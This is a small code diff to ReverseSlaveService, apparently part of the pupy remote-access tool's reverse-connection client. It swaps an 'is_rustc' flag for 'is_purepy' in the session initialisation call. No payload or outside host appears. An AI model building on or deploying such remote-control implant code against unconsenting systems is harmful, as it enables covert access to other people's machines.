@@ -164,7 +164,7 @@ class ReverseSlaveService(Service):
         self._conn._config.update(REVERSE_SLAVE_CONF)
 
         pupyimporter = __import__('pupyimporter')
-        is_rustc = "rustc" in sys.version
+        is_purepy = sys.purepy
         self._conn.root.initialize_v2(
             1, (
                 sys.version_info.major,
@@ -187,7 +187,7 @@ class ReverseSlaveService(Service):
                 for function in dir(pupyimporter)
                 if hasattr(getattr(pupyimporter, function), '__call__')
             },
-            is_rustc
+            is_purepy
         )
 
     def on_disconnect(self):
